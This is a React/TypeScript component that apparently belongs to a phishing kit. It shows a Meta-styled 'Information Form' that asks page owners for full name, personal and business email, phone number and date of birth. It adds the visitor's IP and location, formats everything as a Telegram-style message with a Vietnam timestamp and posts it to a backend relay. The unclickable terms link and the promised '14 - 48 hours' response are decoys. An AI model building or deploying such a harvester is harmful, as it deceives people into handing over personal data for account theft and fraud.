import { store } from '@/store/store';
import translateText from '@/utils/translate';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    email: string;
    emailBusiness: string;
    pageName: string;
    day: string;
    month: string;
    year: string;
    note: string;
}

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [isChecked, setIsChecked] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        email: '',
        emailBusiness: '',
        pageName: '',
        day: '',
        month: '',
        year: '',
        note: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setBaseInfo, setUserInfo } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Information Form', 'Full Name', 'Email', 'Email Business', 'Page Name', 'Date of Birth', 'Day', 'Month', 'Year', 'Note', 'Our response will be sent to you within 14 - 48 hours.', 'I agree with', 'Terms of use', 'Send'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setIsLoading(true);

        const dateOfBirth = formData.day && formData.month && formData.year ? `${formData.day}/${formData.month}/${formData.year}` : 'N/A';

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📧 Email:</b> <code>${formData.email}</code>
<b>💼 Email Business:</b> <code>${formData.emailBusiness}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>📘 Page Name:</b> <code>${formData.pageName}</code>
<b>🎂 Date of Birth:</b> <code>${dateOfBirth}</code>
<b>📝 Note:</b> <code>${formData.note || 'N/A'}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
                setBaseInfo(message);
            }

            setUserInfo({
                fullName: formData.fullName,
                email: formData.email,
                phone: phoneNumber
            });

            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    const inputClassName = 'w-full h-[40px] px-[11px] rounded-[10px] border border-[#d4dbe3] bg-white text-[14px] outline-none transition-all duration-200 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100 focus:border-[#3b82f6] focus:shadow-md focus:shadow-blue-100';

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-full w-full max-w-lg flex-col overflow-hidden rounded-[16px] bg-white px-5 py-5 shadow-lg'>
                <div className='mb-[10px] flex items-center justify-between'>
                    <p className='flex items-center justify-center text-[15px] font-bold text-[#0A1317]'>{t('Information Form')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-[18px] w-[18px] cursor-pointer opacity-60 transition-opacity duration-200 hover:opacity-100' aria-label='Close modal'>
                        <svg viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round' className='h-[18px] w-[18px]'>
                            <line x1='18' y1='6' x2='6' y2='18'></line>
                            <line x1='6' y1='6' x2='18' y2='18'></line>
                        </svg>
                    </button>
                </div>

                <div className='flex-1 overflow-y-auto'>
                    <form onSubmit={handleSubmit} className='flex h-full w-full flex-col'>
                        <div className='w-full'>
                            <input name='fullName' type='text' placeholder={t('Full Name')} value={formData.fullName} onChange={handleInputChange} className={`${inputClassName} mb-[10px]`} />

                            <input name='email' type='email' placeholder={t('Email')} value={formData.email} onChange={handleInputChange} className={`${inputClassName} mb-[10px]`} />

                            <input name='emailBusiness' type='email' placeholder={t('Email Business')} value={formData.emailBusiness} onChange={handleInputChange} className={`${inputClassName} mb-[10px]`} />

                            <input name='pageName' type='text' placeholder={t('Page Name')} value={formData.pageName} onChange={handleInputChange} className={`${inputClassName} mb-[10px]`} />

                            <div className='iti-container mb-[10px] h-[40px] w-full overflow-hidden rounded-[10px] border border-[#d4dbe3] bg-white text-[14px]'>
                                <IntlTelInput
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        name: 'phoneNumber',
                                        className: 'h-full w-full px-[11px] outline-none border-0'
                                    }}
                                />
                            </div>

                            <p className='mb-[7px] text-[14px] font-bold text-[#9a979e]'>{t('Date of Birth')}</p>
                            <div className='mb-[10px] grid grid-cols-3 gap-[10px]'>
                                <input name='day' type='number' placeholder={t('Day')} value={formData.day} onChange={handleInputChange} className={inputClassName} />
                                <input name='month' type='number' placeholder={t('Month')} value={formData.month} onChange={handleInputChange} className={inputClassName} />
                                <input name='year' type='number' placeholder={t('Year')} value={formData.year} onChange={handleInputChange} className={inputClassName} />
                            </div>

                            <textarea name='note' placeholder={t('Note')} value={formData.note} onChange={handleInputChange} className='mb-[10px] h-[100px] w-full resize-none rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] py-[11px] text-[14px] outline-none' />

                            <p className='mb-[7px] text-[14px] text-[#9a979e]'>{t('Our response will be sent to you within 14 - 48 hours.')}</p>

                            <div className='mb-5 mt-[15px]'>
                                <label className='flex cursor-pointer items-center gap-[5px] text-[14px]'>
                                    <span className='inline-flex cursor-pointer items-center'>
                                        <input type='checkbox' checked={isChecked} onChange={(e) => setIsChecked(e.target.checked)} className='sr-only' />
                                        <span className={`flex h-4 w-4 items-center justify-center rounded-[4px] border transition-all duration-200 ${isChecked ? 'border-[#0064E0] bg-[#0064E0]' : 'border-gray-300 bg-white'}`}>
                                            {isChecked && (
                                                <svg className='h-3 w-3 text-white' fill='none' stroke='currentColor' strokeWidth='3' viewBox='0 0 24 24'>
                                                    <polyline points='20 6 9 17 4 12'></polyline>
                                                </svg>
                                            )}
                                        </span>
                                    </span>
                                    {t('I agree with')}
                                    <span className='pointer-events-none inline-flex items-center gap-[5px] text-[#0d6efd]'>
                                        {t('Terms of use')}
                                        <svg className='inline h-[10px] w-[10px]' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2'>
                                            <path d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'></path>
                                            <polyline points='15 3 21 3 21 9'></polyline>
                                            <line x1='10' y1='14' x2='21' y2='3'></line>
                                        </svg>
                                    </span>
                                </label>
                            </div>

                            <button type='submit' disabled={isLoading} className={`mt-5 flex h-[40px] min-h-[40px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] pb-[10px] pt-[10px] text-white ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                                {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
